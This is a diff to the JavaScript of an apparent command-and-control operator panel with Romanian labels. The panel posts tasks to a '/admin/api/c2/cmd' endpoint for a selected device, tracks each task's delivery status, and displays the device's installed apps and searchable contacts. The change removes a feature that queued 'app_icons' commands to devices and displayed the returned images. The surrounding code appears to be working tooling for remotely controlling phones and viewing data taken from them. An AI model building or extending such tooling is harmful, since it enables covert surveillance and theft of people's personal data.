@@ -1945,7 +1945,6 @@ function renderApps(d){
   }
   h+=rawJson(d);
   h+="</div>";
-  setTimeout(function(){loadAppIcons(list)},50);
   return h;
 }
 function renderContacts(d){
@@ -2164,18 +2163,7 @@ function fireContSearch(){var s=document.getElementById("contSearch");
 function fireContPage(off,lim){var s=document.getElementById("contSearch");
   var p={offset:off,limit:lim};if(s&&s.value.trim())p.search=s.value.trim();
   firePagedQuery("contacts",p)}
-// ── App icon loading ────────────────────────────────────────────
-var _iconCache=new Map();
-function loadAppIcons(apps){
-  var pkgs=[];
-  apps.forEach(function(a){if(a.pkg&&!_iconCache.has(a.pkg))pkgs.push(a.pkg)});
-  if(!pkgs.length)return;
-  for(var i=0;i<pkgs.length;i+=10){
-    (function(batch){
-      api("/admin/api/c2/cmd",{method:"POST",body:JSON.stringify({uid:selDev(),tasks:[{action:"app_icons",params:{pkgs:batch,size:48}}]})}).catch(function(){})
-    })(pkgs.slice(i,i+10));
-  }
-}
+// app_icons: fully disabled pending proper implementation + regression testing
 var ST={queued:["queued","ÎN COADĂ"],delivered:["delivered","LIVRATĂ"],done:["done","GATA ✓"],failed:["failed","EROARE"],timeout:["timeout","EXPIRATĂ"]};
 async function loadAll(){
   var now=Math.floor(Date.now()/1000);
@@ -2233,18 +2221,6 @@ async function loadDetail(){
       }).join("")
       :'<span class="empty">niciun rezultat</span>';
     clearResultsLoading();
-    // Process app_icons results — replace placeholder icons
-    all.forEach(function(x){
-      if(x.action==="app_icons"&&x.ok&&x.data&&x.data.icons){
-        x.data.icons.forEach(function(ic){
-          if(ic.b64&&ic.pkg){
-            _iconCache.set(ic.pkg,ic.b64);
-            var el=document.querySelector(".app-ico[data-pkg='"+ic.pkg+"']");
-            if(el)el.innerHTML="<img src='data:image/png;base64,"+ic.b64+"' style='width:24px;height:24px;border-radius:4px'>";
-          }
-        });
-      }
-    });
   }catch(e){}
 }
 async function dl(key){
